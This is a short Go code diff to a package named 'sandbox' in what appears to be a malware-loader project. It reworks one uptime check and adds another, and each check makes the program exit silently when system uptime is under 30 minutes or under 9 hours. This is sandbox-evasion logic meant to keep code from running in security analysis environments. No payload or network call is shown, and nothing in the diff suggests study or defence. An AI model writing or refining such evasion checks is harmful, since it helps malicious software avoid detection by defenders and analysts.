@@ -3,12 +3,11 @@ package sandbox
 import (
 	"os"
 	"time"
-	"variant/wdll"
+	"variant/xwindows"
 )
 
 func BootTime() {
-	GetTickCount := wdll.GetTickCount()
-	startTime, _, _ := GetTickCount.Call()
+	startTime, _ := xwindows.GetTickCount()
 	if startTime == 0 {
 		os.Exit(0)
 	}
@@ -16,6 +15,14 @@ func BootTime() {
 	checkTime := time.Duration(startTime * 1000 * 1000)
 	setTime := 30 * time.Minute
 	if checkTime < setTime {
+		os.Exit(0)
+	}
+}
+
+func BootTimeGetTime() {
+	overtime, _ := xwindows.TimeGetTime()
+
+	if overtime/3600000.0 < 9 {
 		os.Exit(0)
 	}
 }
